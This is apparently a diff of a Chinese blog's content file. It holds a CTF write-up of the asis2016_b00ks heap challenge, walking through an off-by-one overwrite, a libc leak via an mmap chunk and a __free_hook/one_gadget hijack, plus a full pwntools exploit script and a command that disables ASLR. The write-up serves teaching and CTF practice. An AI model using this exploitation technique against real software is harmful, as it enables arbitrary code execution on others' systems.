-<p>而在没有被纂改前，这段区域其实是book1_desc的内容，感受到不对劲了吗？<br><strong>这段区域我们是可以预先用edit功能布置的</strong>。重新再来一遍，回到溢出前的状态<br><img src="/./images/p7/image-42.png"><br>c回车，选择edit，修改图书内容<br><img src="/./images/p7/image-41.png"><br>回来看看book1_desc的内容<br><img src="/./images/p7/image-43.png"><br>这段6666在我们利用off_by_one漏洞溢出作者名后，会成为fake_book1_id和fake_book1_name<br><strong>明确一下，fake_book1_id和fake_book1_name的内容我们可以通过edit自定义</strong></p>
-<p>这有什么用呢？我们的思路是先拿到libc基地址，通过libc基地址去计算__free_hook真实地址，在伪造的图书结构体中部署__free_hook钩子，然后free一个指向one_gadget的地址，触发execve(’&#x2F;bin&#x2F;sh’)拿到shell。那么我们先得拿到libc_base。</p>
-<h2 id="4-泄露libc基地址"><a href="#4-泄露libc基地址" class="headerlink" title="4.泄露libc基地址"></a>4.泄露libc基地址</h2><p><strong>当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展。而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</strong><br>看一下top_chunk大小<br><img src="/./images/p7/image-46.png"><br>所以，我们申请一个大于0x20b81的空间，使程序使用mmap拓展空间，这就是book2的申请</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>
-<p>此时，我们画一下图书在内存中的布局<br><img src="/./images/p7/image-50.png"><br>我们想要得到libc的基地址，可以通过泄露以mmap拓展的这个book2的地址，怎么泄露呢？我们知道当调用Print的时候，程序会打印出来一些信息。<strong>既然想打印出来book2的地址，那么就可以将fake_book1_name指针指向book2_name的地址。Print在打印book1_name的时候，就会找到book2_name，把指针值（因为book2是以mmap拓展，所以book2的指针指向的地址都是0x7fff开头的）打印出来</strong>，看下图<br><img src="/./images/p7/image-51.png"><br>所以只需要将fake_book1_name指向 **0x555555608168 (&#x3D;book1_addr + 0x38,book1_addr是最初我们泄露的地址，也是real_book1_id)**，这样就可以泄露出这个0x7fff开头的地址，从而得到libc<br>用edit布置我们的fake_book1_id为1；fake_book1_name为book1_addr + 0x38</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-53.png"><br>再利用off by one 漏洞（change作者名），将图书1结构体指针的低位覆盖为\x00，这样fake_book就生效了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br></pre></td></tr></table></figure>
-<p><img src="/Snipaste_2025-02-15_00-09-32.png"><br>那么此时打印Book1的信息，就可以泄露出“0x7ffff7fd4010”这个地址了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-54.png"><br>前面说过，book2_name的地址，相对libc基地址的偏移是固定的，通过vmmap看到可读可执行的libc.so的起始地址是0x7ffff7800000<br><img src="/./images/p7/image-55.png"><br>我们得到的book2_name_addr的地址是0x7ffff7fd4010，那么</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># book2_name_addr - libc_base = 0x7ffff7fd4010 - 0x7ffff7800000 = 0x7D4010</span><br><span class="line"># 也就是</span><br><span class="line"># libc_base = book2_name_addr - 0x7D4010</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-钩子和one-gadget"><a href="#5-钩子和one-gadget" class="headerlink" title="5.钩子和one_gadget"></a>5.钩子和one_gadget</h2><p>当delete一个book的时候，程序会调用free，所以我们用__free_hook去钩one_gadget<br>先计算__free_hook的地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br></pre></td></tr></table></figure>
-<p>至于one_gadget，因为我们已经泄露libc了，所以One_gadget可以直接在libc.so里面找，然后算上偏移就可以了<br><img src="/./images/p7/image-56.png"><br>看到三个gadget：0x4527a、0xf03a4、0xf1247（不同ubuntu版本得到的不一样，我的版本下第一个可以成功）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="6-改善《4-泄露libc基地址》的payload"><a href="#6-改善《4-泄露libc基地址》的payload" class="headerlink" title="6.改善《4.泄露libc基地址》的payload"></a>6.改善《4.泄露libc基地址》的payload</h2><p>我们先想一想，接下来挂钩子明显还是要用到fake_book1结构体，但是不能像之前那要edit(1,xxx)布置了，<strong>因为book1结构体指针已经指向了fake_book1，如果直接edit(1,xxx)会修改fake_book1_desc指针指向的内容，而此时我们意识到我们的fake_book1_desc指针是空的！</strong><br>还记得当时我们当时布置fake_book1是怎么样布置的吗？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/./images/p7/image-57.png"><br>稍微改善一下那时候的payload，把fake_book1_desc这片空白的空间也利用起来：fake_book1_name指向了book2_name，让fake_book1_desc也指向book2_desc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)     # 0xffff作用内存地址的结束符</span><br><span class="line"># book2_desc和book2_name地址相差8个字节</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
-<p>此时内存是这样的<br><img src="/./images/p7/image-58.png"></p>
-<h2 id="7-挂钩子"><a href="#7-挂钩子" class="headerlink" title="7.挂钩子"></a>7.挂钩子</h2><p>改善之后，<strong>调用edit(1,xxx)，程序会直接去修改book2_desc指针为xxx，所以我们通过edit(1,free_hook)把钩子放在book2_desc，再通过edit(2,one_gadget),把one_gadget挂在钩子上，调用delete执行free，GET SHELL!</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&quot;/home/kuban/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">io = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def delete(book_id):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def edit(book_id,des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def Print():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def change(author):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,author)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(208,b&#x27;AAAA&#x27;,32,b&#x27;aaaa&#x27;)</span><br><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">libc_base = book2_name_addr - 0x7d4010</span><br><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br><span class="line">log.success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 ]]></content>
   </entry>
   <entry>
@@ -500,6 +520,99 @@
       </tags>
   </entry>
   <entry>
+    <title>【buuCTF刷题】asis2016_b00ks</title>
+    <url>/posts/b08e/</url>
+    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
+<p>题目链接： <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FzaXMyMDE2X2IwMGtz">https://buuoj.cn/challenges#asis2016_b00ks<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>2016年的题花了好几天时间才做出来，遂记录一下。<br>通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展，而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</p>
+<span id="more"></span>
+
+
+<h1 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h1><p>进入程序，先输入一个作者名，跳出目录<br><img src="/./images/p7/image.png"></p>
+<p>依次尝试，根据输出预定义一下对应函数</p>
+<ol>
+<li><p>Create a book<br>进入创建要输入name_size , name , des_size , des<br> <img src="/./images/p7/image-1.png"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Delete a book<br> 删除功能直接输入book_id就可以了，Book_id可以在打印功能中看到<br> <img src="/./images/p7/image-2.png"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def delete(book_id):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(id))</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+<li><p>Edit a book<br> 编辑功能输入要编辑的Book_id，然后编辑内容<br> <img src="/./images/p7/image-3.png"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def edit(book_id,des):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>Print book detail<br> 打印所有书的信息，包括作者<br> <img src="/./images/p7/image-4.png"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Print():</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>Change current author name<br> 切换作者，也是直接输入新作者名就可以<br> <img src="/./images/p7/image-5.png"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def change(author):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,author)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>放入IDA里面，对一些函数进行重命名<br><img src="/./images/p7/image-6.png"><br>先看scanf_author函数，通过前面的运行测试我们能猜出来大概是输入作者名的函数，点进去看到确实是让我们输入作者名<br><img src="/./images/p7/image-7.png"><br>是通过调用scanf_to_ptr的函数输入作者名，并且有两个参数，第一个参数off_202018其实是data段上的一个指针<br><img src="/./images/p7/image-9.png"><br>点进去函数看一下<br><img src="/./images/p7/image-8.png"><br>可以看到，通过循环变量i向off_202018这个指针的地址读入作者名，第二个参数在 i=&#x3D;a2 判断中作为循环终止的条件，注意到i是从0开始变化，如果循环条件是 i&#x3D;&#x3D;a2 ，这个循环实际上会执行33次，就导致作者名的长度是33个字节，有一个字节的溢出。<br><strong>scanf_to_ptr的函数存在off-by-one漏洞</strong></p>
+<h2 id="Create-a-book"><a href="#Create-a-book" class="headerlink" title="Create a book"></a>Create a book</h2><p>首先输入name_size的大小，然后根据size分配书名的堆，并把堆地址给ptr_name。如果堆空间分配成功，则向此堆中写入书名（第21行）<br><img src="/./images/p7/image-11.png"><br>注意写入书名调用的是scanf_to_ptr函数，我们分析过这个函数的功能是向第一个参数对应的空间写入内容，并且这个函数存在off-by-one漏洞。</p>
+<p>同样的操作，再输入desc_size，根据size再分配一个堆给书的内容<br><img src="/./images/p7/image-12.png"><br>如果堆空间分配成功，则调用漏洞函数scanf_to_ptr向堆中写入书的内容</p>
+<p>接下来看这里，分配了一个0x20的空间给一个变量，而这个变量其实存着一个结构体<br><img src="/./images/p7/image-13.png"></p>
+<p>第56、58、59、60行描述了结构体的成员变量，根据这些信息还原一下结构体是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;               </span><br><span class="line">    int id;          </span><br><span class="line">    char *name;                 </span><br><span class="line">    char *description;          </span><br><span class="line">    int description_size; </span><br><span class="line">&#125; Book;</span><br></pre></td></tr></table></figure>
+<p>可以看到，程序用一个结构体去描述图书的信息</p>
+<p>57行将结构体的地址赋给了off_202010指针，而这个地址我们之前见过一次。在main函数的一开始，我们<strong>在off_202018指针指向的地址存放了作者名，在off_202010指针指向的地址存放图书结构体</strong><br><img src="/./images/p7/image-17.png"><br><strong>注意黄色标注的区域，作者名在超过0x20——也就是32个字节后，就会来到off_202010指针所指的空间。我们在前面分析知道，作者名是通过scanf_to_ptr函数读入，而这个函数存在off_by_one漏洞，导致作者名有一个字节的溢出，而这个溢出则会直接覆盖off_202010的第一个低字节。</strong><br>如果我们给作者名输入32个字符，因为字符串是\x00结尾，所以\x00会作为第33个字符溢出到off_202010的第一个低字节。</p>
+<h2 id="Delete-a-book"><a href="#Delete-a-book" class="headerlink" title="Delete a book"></a>Delete a book</h2><p>delete函数通过free释放空间，并且置为0，不存在UAF漏洞<br><img src="/./images/p7/image-15.png"></p>
+<h2 id="Change-current-author-name"><a href="#Change-current-author-name" class="headerlink" title="Change current author name"></a>Change current author name</h2><p>改变作者时，scanf_to_ptr同样是向off_202018的空间读入作者名<br><img src="/./images/p7/image-16.png"></p>
+<h2 id="Efit-和-Print"><a href="#Efit-和-Print" class="headerlink" title="Efit 和 Print"></a>Efit 和 Print</h2><p>这两个函数没什么特殊的<br><img src="/./images/p7/image-18.png"><br><img src="/./images/p7/image-19.png"></p>
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-替换libc"><a href="#1-替换libc" class="headerlink" title="1.替换libc"></a>1.替换libc</h2><p>由于是2016年的题，本地环境很难与远程环境一致，我这里用patchelf换了ubuntu 16的libc和ld，进行动态调试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./b00ks</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./b00ks </span><br></pre></td></tr></table></figure>
+<p>ldd验证一下<br><img src="/./images/p7/image-20.png"></p>
+<h2 id="2-动态调试-泄露book1-addr"><a href="#2-动态调试-泄露book1-addr" class="headerlink" title="2.动态调试 &amp;&amp; 泄露book1_addr"></a>2.动态调试 &amp;&amp; 泄露book1_addr</h2><p>在动态调试之前可以先把ASLR保护关掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//重启机器后ASLR保护会自动打开    </span><br></pre></td></tr></table></figure>
+
+<p>gdb r 调试运行程序，输入作者名时输入32个字节<br><img src="/./images/p7/image-21.png"><br>ctrl+c 进入调试<br><img src="/./images/p7/image-22.png"><br>记录起始地址0x555555400000，作者名在偏移off_202018处，定位到作者名地址，<strong>绿框中的\x00其实是作者名溢出的字节</strong><br><img src="/./images/p7/image-24.png"></p>
+<p>按c回到程序中，创建一本书名和内容大小均为10的图书<br><img src="/./images/p7/image-25.png"><br>ctrl+c 进入调试，看看内存布局<br><img src="/./images/p7/image-26.png"><br>发现在作者名后面紧跟上了一个地址，根据静态分析我们推测这个地址指向刚刚创建的图书结构体，跟进去看的确如此<br><img src="/./images/p7/image-27.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555607460 = 图书结构体 = book1_id</span><br><span class="line">0x0000555555607468 = book1_name</span><br><span class="line">0x0000555555607470 = book1_desc</span><br><span class="line">0x0000555555607478 = book1_desc_size</span><br></pre></td></tr></table></figure>
+<p>并且，由于author和存放图书结构体的地址是挨着的，当我们print作者名的时候，由于没有\x00截断，也会把图书结构体地址泄露出来<br><img src="/./images/p7/image-44.png"><br><img src="/./images/p7/image-45.png"><br>通过下面的脚本泄露book1_addr</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(10,b&#x27;AAAA&#x27;,10,b&#x27;aaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br></pre></td></tr></table></figure>
+
+
+<p>根据前面的分析，如果我们向作者名输入32个字符，会溢出\x00,然后覆盖黄框中的地位\x60为\x00<br><img src="/./images/p7/image-26.png"></p>
+<p>验证一下，回到程序中，重新输入32个字节的作者名<br><img src="/./images/p7/image-28.png"><br>再查看内存，确实地位被覆盖为了\x00<br><img src="/./images/p7/image-29.png"><br>此时，程序会认为0x0000555555607400是book1结构体的地址（也是book1_id）<br><img src="/./images/p7/image-31.png"><br>而此时，这里什么都没有，显然这里是存在漏洞的，那该怎么利用呢？<br><strong>多试几次我们会发现，根据我们输入的name_size和desc_size的不同，图书结构体的地址会发生变化</strong><br>当name_size&#x3D;64，desc_size&#x3D;32时<br><img src="/./images/p7/image-33.png"><br>当name_size&#x3D;256，desc_size&#x3D;32时<br><img src="/./images/p7/image-34.png"></p>
+<h2 id="3-fake-book的故事"><a href="#3-fake-book的故事" class="headerlink" title="3.fake_book的故事"></a>3.fake_book的故事</h2><p>如果我们进行适当的调整，让book1_desc的地址的低位是\x00，比如在我当前环境下name_size&#x3D;208，desc_size&#x3D;32时内存是这样的<br><img src="/./images/p7/image-36.png"><br>此时book1_desc在0x0000555555607500这个地址，我们可以通过edit功能修改这里的内容</p>
+<p>为什么要这样做呢？想想off_by_one漏洞的利用，我们说过我们可以通过change_author，输入32个字节让他溢出<br><img src="/./images/p7/image-37.png"><br>导致上图中红色框框的地址低位变为\x00<br><img src="/./images/p7/image-38.png"><br>现在再来看看是什么情况?现在程序认为黄色标注的才是他的book1<br><img src="/./images/p7/image-39.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555607500 = book1_id</span><br><span class="line">0x555555607508 = book1_name</span><br><span class="line">0x555555607510 = book1_desc</span><br><span class="line">0x555555607518 = book1_desc_size</span><br></pre></td></tr></table></figure>
+<p>而在没有被纂改前，这段区域其实是book1_desc的内容，感受到不对劲了吗？<br><strong>这段区域我们是可以预先用edit功能布置的</strong>。重新再来一遍，回到溢出前的状态<br><img src="/./images/p7/image-42.png"><br>c回车，选择edit，修改图书内容<br><img src="/./images/p7/image-41.png"><br>回来看看book1_desc的内容<br><img src="/./images/p7/image-43.png"><br>这段6666在我们利用off_by_one漏洞溢出作者名后，会成为fake_book1_id和fake_book1_name<br><strong>明确一下，fake_book1_id和fake_book1_name的内容我们可以通过edit自定义</strong></p>
+<p>这有什么用呢？我们的思路是先拿到libc基地址，通过libc基地址去计算__free_hook真实地址，在伪造的图书结构体中部署__free_hook钩子，然后free一个指向one_gadget的地址，触发execve(’&#x2F;bin&#x2F;sh’)拿到shell。那么我们先得拿到libc_base。</p>
+<h2 id="4-泄露libc基地址"><a href="#4-泄露libc基地址" class="headerlink" title="4.泄露libc基地址"></a>4.泄露libc基地址</h2><p><strong>当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展。而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</strong><br>看一下top_chunk大小<br><img src="/./images/p7/image-46.png"><br>所以，我们申请一个大于0x20b81的空间，使程序使用mmap拓展空间，这就是book2的申请</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>
+<p>此时，我们画一下图书在内存中的布局<br><img src="/./images/p7/image-50.png"><br>我们想要得到libc的基地址，可以通过泄露以mmap拓展的这个book2的地址，怎么泄露呢？我们知道当调用Print的时候，程序会打印出来一些信息。<strong>既然想打印出来book2的地址，那么就可以将fake_book1_name指针指向book2_name的地址。Print在打印book1_name的时候，就会找到book2_name，把指针值（因为book2是以mmap拓展，所以book2的指针指向的地址都是0x7fff开头的）打印出来</strong>，看下图<br><img src="/./images/p7/image-51.png"><br>所以只需要将fake_book1_name指向 **0x555555608168 (&#x3D;book1_addr + 0x38,book1_addr是最初我们泄露的地址，也是real_book1_id)**，这样就可以泄露出这个0x7fff开头的地址，从而得到libc<br>用edit布置我们的fake_book1_id为1；fake_book1_name为book1_addr + 0x38</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/./images/p7/image-53.png"><br>再利用off by one 漏洞（change作者名），将图书1结构体指针的低位覆盖为\x00，这样fake_book就生效了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br></pre></td></tr></table></figure>
+<p><img src="/Snipaste_2025-02-15_00-09-32.png"><br>那么此时打印Book1的信息，就可以泄露出“0x7ffff7fd4010”这个地址了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+<p><img src="/./images/p7/image-54.png"><br>前面说过，book2_name的地址，相对libc基地址的偏移是固定的，通过vmmap看到可读可执行的libc.so的起始地址是0x7ffff7800000<br><img src="/./images/p7/image-55.png"><br>我们得到的book2_name_addr的地址是0x7ffff7fd4010，那么</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># book2_name_addr - libc_base = 0x7ffff7fd4010 - 0x7ffff7800000 = 0x7D4010</span><br><span class="line"># 也就是</span><br><span class="line"># libc_base = book2_name_addr - 0x7D4010</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-钩子和one-gadget"><a href="#5-钩子和one-gadget" class="headerlink" title="5.钩子和one_gadget"></a>5.钩子和one_gadget</h2><p>当delete一个book的时候，程序会调用free，所以我们用__free_hook去钩one_gadget<br>先计算__free_hook的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br></pre></td></tr></table></figure>
+<p>至于one_gadget，因为我们已经泄露libc了，所以One_gadget可以直接在libc.so里面找，然后算上偏移就可以了<br><img src="/./images/p7/image-56.png"><br>看到三个gadget：0x4527a、0xf03a4、0xf1247（不同ubuntu版本得到的不一样，我的版本下第一个可以成功）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="6-改善《4-泄露libc基地址》的payload"><a href="#6-改善《4-泄露libc基地址》的payload" class="headerlink" title="6.改善《4.泄露libc基地址》的payload"></a>6.改善《4.泄露libc基地址》的payload</h2><p>我们先想一想，接下来挂钩子明显还是要用到fake_book1结构体，但是不能像之前那要edit(1,xxx)布置了，<strong>因为book1结构体指针已经指向了fake_book1，如果直接edit(1,xxx)会修改fake_book1_desc指针指向的内容，而此时我们意识到我们的fake_book1_desc指针是空的！</strong><br>还记得当时我们当时布置fake_book1是怎么样布置的吗？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38)</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/./images/p7/image-57.png"><br>稍微改善一下那时候的payload，把fake_book1_desc这片空白的空间也利用起来：fake_book1_name指向了book2_name，让fake_book1_desc也指向book2_desc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)     # 0xffff作用内存地址的结束符</span><br><span class="line"># book2_desc和book2_name地址相差8个字节</span><br><span class="line">edit(1,payload)</span><br></pre></td></tr></table></figure>
+<p>此时内存是这样的<br><img src="/./images/p7/image-58.png"></p>
+<h2 id="7-挂钩子"><a href="#7-挂钩子" class="headerlink" title="7.挂钩子"></a>7.挂钩子</h2><p>改善之后，<strong>调用edit(1,xxx)，程序会直接去修改book2_desc指针为xxx，所以我们通过edit(1,free_hook)把钩子放在book2_desc，再通过edit(2,one_gadget),把one_gadget挂在钩子上，调用delete执行free，GET SHELL!</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
